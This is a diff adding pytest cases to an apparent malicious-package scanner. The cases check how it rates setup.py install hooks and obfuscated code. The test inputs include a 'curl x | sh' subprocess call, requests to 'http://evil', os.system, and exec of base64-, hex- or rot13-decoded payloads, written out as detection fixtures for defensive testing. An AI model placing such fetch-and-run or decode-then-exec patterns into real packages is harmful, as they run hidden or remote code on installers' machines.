@@ -187,6 +187,82 @@ def test_install_hook_without_exec_sink_is_medium(tmp_path):
     assert hooks[0].severity is Severity.MEDIUM
 
 
+def _hook_severity(tmp_path, body: str, imports: str = "") -> Severity:
+    (tmp_path / "setup.py").write_text(
+        f"{imports}from setuptools import setup\n"
+        "from setuptools.command.install import install\n"
+        "class Post(install):\n"
+        "    def run(self):\n"
+        + "".join(f"        {line}\n" for line in body.splitlines())
+        + "setup(name='x', cmdclass={'install': Post})\n",
+        encoding="utf-8",
+    )
+    [hook] = [f for f in analyze_path(tmp_path) if f.rule == RULE_INSTALL_HOOK]
+    return hook.severity
+
+
+@pytest.mark.parametrize(
+    "body",
+    [
+        # 실측 오탐(fwquant·jdaviz·otpme) — 원래 설치를 진행시키는 위임 호출 + 파일 작업
+        "install.run(self)\ninit_user_directory()",
+        "super().run()",
+        "cfg = {}\ncfg.get('k')\ndb.connect()",
+        "pattern = re.compile('x')",
+    ],
+)
+def test_install_hook_delegation_and_common_names_are_not_sinks(tmp_path, body):
+    assert _hook_severity(tmp_path, body) is Severity.MEDIUM
+
+
+@pytest.mark.parametrize(
+    ("body", "imports"),
+    [
+        ("install.run(self)\nsubprocess.run(['sh', '-c', 'curl x | sh'])", "import subprocess\n"),
+        ("requests.get('http://evil')", "import requests\n"),
+        ("urllib.request.urlopen('http://evil')", "import urllib.request\n"),
+        ("os.system('id')", "import os\n"),
+        ("exec(payload)", ""),
+    ],
+)
+def test_install_hook_real_sinks_stay_high(tmp_path, body, imports):
+    assert _hook_severity(tmp_path, body, imports) is Severity.HIGH
+
+
+@pytest.mark.parametrize(
+    "src",
+    [
+        # 실측 오탐 seleniumbase — 버전 읽기 관용구. bytes.decode 는 codecs.decode 가 아니다
+        "about = {}\nwith open('v.py', 'rb') as f:\n    exec(f.read().decode('utf-8'), about)\n",
+        # 실측 오탐 tocode-cli — re.compile 은 정규식이지 코드 실행이 아니다
+        "import re\nneedle = re.compile(re.escape(bytes.fromhex(pattern)))\n",
+    ],
+)
+def test_common_idioms_are_not_obfuscated_payloads(tmp_path, src):
+    (tmp_path / "mod.py").write_text(src, encoding="utf-8")
+    assert RULE_OBFUSCATED not in rules_in(analyze_path(tmp_path))
+
+
+@pytest.mark.parametrize(
+    "src",
+    [
+        "import codecs\nexec(codecs.decode(P, 'rot13'))\n",
+        "from codecs import decode\nexec(decode(P, 'rot13'))\n",
+        "exec(bytes.fromhex(P))\n",
+        "import builtins, base64\nbuiltins.exec(base64.b64decode(P))\n",
+    ],
+)
+def test_real_decode_then_execute_still_high(tmp_path, src):
+    (tmp_path / "mod.py").write_text(src, encoding="utf-8")
+    obf = [f for f in analyze_path(tmp_path) if f.rule == RULE_OBFUSCATED]
+    assert obf and obf[0].severity is Severity.HIGH
+
+
+def test_method_named_eval_is_not_a_dangerous_call(tmp_path):
+    (tmp_path / "mod.py").write_text("model.eval()\nexpr.compile()\n", encoding="utf-8")
+    assert analyze_path(tmp_path) == []
+
+
 def test_install_hook_defined_elsewhere_is_reported_not_blocked(tmp_path):
     """클래스가 다른 모듈에 있으면 들여다볼 수 없다 — 조용히 넘기지 않되 차단도 안 한다."""
     (tmp_path / "setup.py").write_text(
